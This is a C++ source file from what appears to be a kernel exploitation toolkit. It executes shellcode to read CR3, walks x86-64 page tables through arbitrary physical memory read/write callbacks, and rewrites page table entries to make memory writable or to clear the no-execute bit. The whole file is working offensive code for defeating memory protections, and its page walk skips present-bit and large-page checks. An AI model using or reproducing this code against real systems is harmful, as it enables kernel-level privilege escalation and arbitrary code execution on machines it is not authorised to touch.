#include "PageTableUtils.h"
#include "ShellcodeUtils.h"
#include <iostream>

bool PageTableUtils::GetCR3Value(
    const MemoryReadFn& readMemory,
    const MemoryWriteFn& writeMemory,
    std::function<bool(const void*, size_t, uint64_t*)> executeShellcode,
    uint64_t& cr3Value
) {
    // Create CR3 read shellcode
    auto shellcode = ShellcodeUtils::CreateCR3ReadShellcode();
    
    // Execute shellcode to get CR3
    uint64_t result = 0;
    if (!executeShellcode(shellcode.data(), shellcode.size(), &result)) {
        std::cerr << "[-] Failed to execute CR3 read shellcode" << std::endl;
        return false;
    }

    cr3Value = result;
    return true;
}

bool PageTableUtils::ModifyPageTableEntry(
    uint64_t cr3,
    uint64_t virtualAddr,
    const MemoryReadFn& readMemory,
    const MemoryWriteFn& writeMemory,
    std::function<void(uint64_t&)> modifier
) {
    // Calculate page table indices
    uint64_t pml4Index = (virtualAddr >> 39) & 0x1FF;
    uint64_t pdptIndex = (virtualAddr >> 30) & 0x1FF;
    uint64_t pdIndex = (virtualAddr >> 21) & 0x1FF;
    uint64_t ptIndex = (virtualAddr >> 12) & 0x1FF;

    // Walk the page tables
    uint64_t pml4e = 0;
    if (!readMemory(cr3 + pml4Index * 8, &pml4e, sizeof(pml4e))) {
        std::cerr << "[-] Failed to read PML4E" << std::endl;
        return false;
    }
    pml4e &= 0xFFFFFFFFF000ULL;

    uint64_t pdpte = 0;
    if (!readMemory(pml4e + pdptIndex * 8, &pdpte, sizeof(pdpte))) {
        std::cerr << "[-] Failed to read PDPTE" << std::endl;
        return false;
    }
    pdpte &= 0xFFFFFFFFF000ULL;

    uint64_t pde = 0;
    if (!readMemory(pdpte + pdIndex * 8, &pde, sizeof(pde))) {
        std::cerr << "[-] Failed to read PDE" << std::endl;
        return false;
    }
    pde &= 0xFFFFFFFFF000ULL;

    // Get PTE address
    uint64_t pteAddr = pde + ptIndex * 8;

    // Read current PTE
    uint64_t pte = 0;
    if (!readMemory(pteAddr, &pte, sizeof(pte))) {
        std::cerr << "[-] Failed to read PTE" << std::endl;
        return false;
    }

    // Modify PTE using provided modifier function
    modifier(pte);

    // Write back modified PTE
    if (!writeMemory(pteAddr, &pte, sizeof(pte))) {
        std::cerr << "[-] Failed to write modified PTE" << std::endl;
        return false;
    }

    std::cout << "[+] Successfully modified PTE for memory at 0x" << std::hex << virtualAddr 
              << " (PTE at physical address 0x" << pteAddr << ")" << std::dec << std::endl;
    return true;
}

bool PageTableUtils::MakeMemoryWritable(
    uint64_t virtualAddr,
    const MemoryReadFn& readMemory,
    const MemoryWriteFn& writeMemory,
    std::function<bool(const void*, size_t, uint64_t*)> executeShellcode
) {
    std::cout << "[*] Making memory writable at 0x" << std::hex << virtualAddr << std::dec << std::endl;

    // Get CR3 value
    uint64_t cr3 = 0;
    if (!GetCR3Value(readMemory, writeMemory, executeShellcode, cr3)) {
        std::cerr << "[-] Failed to get CR3 value" << std::endl;
        return false;
    }

    // Modify PTE to set write bit
    return ModifyPageTableEntry(
        cr3,
        virtualAddr,
        readMemory,
        writeMemory,
        [](uint64_t& pte) {
            pte |= (1ULL << 1);  // Set write bit
        }
    );
}

bool PageTableUtils::MakeMemoryExecutable(
    uint64_t virtualAddr,
    const MemoryReadFn& readMemory,
    const MemoryWriteFn& writeMemory,
    std::function<bool(const void*, size_t, uint64_t*)> executeShellcode
) {
    std::cout << "[*] Making memory executable at 0x" << std::hex << virtualAddr << std::dec << std::endl;

    // Get CR3 value
    uint64_t cr3 = 0;
    if (!GetCR3Value(readMemory, writeMemory, executeShellcode, cr3)) {
        std::cerr << "[-] Failed to get CR3 value" << std::endl;
        return false;
    }

    // Modify PTE to clear NX bit
    return ModifyPageTableEntry(
        cr3,
        virtualAddr,
        readMemory,
        writeMemory,
        [](uint64_t& pte) {
            pte &= ~PTE_NX_BIT;  // Clear NX bit
        }
    );
}
